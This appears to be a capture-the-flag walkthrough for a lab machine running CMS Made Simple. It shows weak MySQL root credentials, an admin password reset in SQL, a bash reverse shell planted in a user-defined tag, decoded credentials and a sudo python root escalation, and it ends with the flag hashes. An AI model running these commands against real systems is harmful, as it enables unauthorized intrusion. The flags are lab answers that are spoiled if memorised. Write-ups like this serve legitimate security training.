# My-CMSMS

**IP Address:** 192.168.238.74

## Enumeration
### Open Ports
| Port #| Service | Details  |
|:------|:---------|:---------|
| 22 | ssh | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80 | http | Apache httpd 2.4.38 ((Debian)) |
| 3306 | mysql | MySQL 8.0.19 |
| 33060 | socks5 | |

## Exploitation
### Exploit Details (Weak Credentials)
* **Name** - Weak Credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

1. The mysql database allows us to connect using root / root as the credentials. We can then reset the admin password for the admin user of the CMS Made Simple website.  

Commands
```
mysql -h $ip -u root -proot
use cmsms_db;
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'password'))) where username = 'admin'; 
```

![Execute Exploit](images/exploit1.png)

2. To gain a reverse shell we login using the reset password and navigate to Extensions > User Defined Tabs > custom_copyright. Then we replace the contents with the script shown below. Then click on Apply, then Run. 

Script
```
system("bash -c 'bash -i >& /dev/tcp/192.168.49.238/53 0>&1'");
```

![Execute Exploit](images/exploit2.png)

3. We can now catch the reverse shell. 

Commands
```bash
whoami
cat /var/www/local.txt
```

## Privilege Escalation
### Exploit Details (Found Credentials / SUDO)
* **Name** - Found Credentials / SUDO
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

Checking the .htpasswd file we can find a base64 encoded string, if we then decode it we find a base32 encoded strings which when decoded shows us the credentials for the armour user account. We can then use SUDO to elevate to the root account. 

Commands
```bash
cat .htpasswd
echo 'TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=' | base64 -d
echo 'MFZG233VOI5FG2DJMVWGIQBRGIZQ====' | base32 -d
su armour
Shield@123
whoami
sudo python -c 'import os; os.system("/bin/sh")'
whoami
cat /root/proof.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
local.txt
13a1c12dcad03dbb943de6dfcaca0cb3
proof.txt
f826b576ec8f556890455cc3ea417887
```